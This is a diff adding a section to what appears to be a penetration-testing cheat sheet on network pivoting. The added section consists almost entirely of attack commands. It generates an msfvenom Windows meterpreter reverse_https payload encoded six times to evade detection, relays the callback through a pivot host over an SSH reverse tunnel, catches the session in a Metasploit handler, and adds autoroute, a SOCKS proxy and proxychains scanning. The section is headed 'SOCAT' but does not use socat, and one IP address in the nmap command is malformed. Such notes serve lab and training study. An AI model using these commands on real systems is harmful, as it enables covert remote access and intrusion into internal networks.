@@ -101,6 +101,39 @@ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
 
 # Reverse Port Forwarding Rules
 meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+```
+
+# SOCAT
+
+```
+Attacker İP: 192.168.0.250/24
+Pivot Host eth0: 192.168.0.200/24
+Pivot Host eth1: 172.16.0.20/16
+Victim Host: 172.16.0.10/16
+
+msfvenom -p windows/x64/meterpreter/reverse_https \
+   LHOST=172.16.0.20 LPORT=8443 \
+   -e x64/zutto_dekiru -i 6 \
+   -f exe -o victim_payload.exe
+
+ssh -R 172.16.0.20:8443:127.0.0.1:4443 root@192.168.0.200 -N -f
+
+msfconsole -q -x "
+use exploit/multi/handler;
+set payload windows/x64/meterpreter/reverse_https;
+set LHOST 0.0.0.0;
+set LPORT 4443;
+exploit -j
+"
+
+msf6 exploit(multi/handler) > sessions -l
+msf6 exploit(multi/handler) > sessions -i 1
+msf6 exploit(multi/handler) > background
+msf6 exploit(multi/handler) > run autoroute 172.16.0.0/16
+msf6 exploit(multi/handler) > run socks5 -p 9050
+
+proxychains nmap -sT 172.160.20 -p-
+```
 
 
 
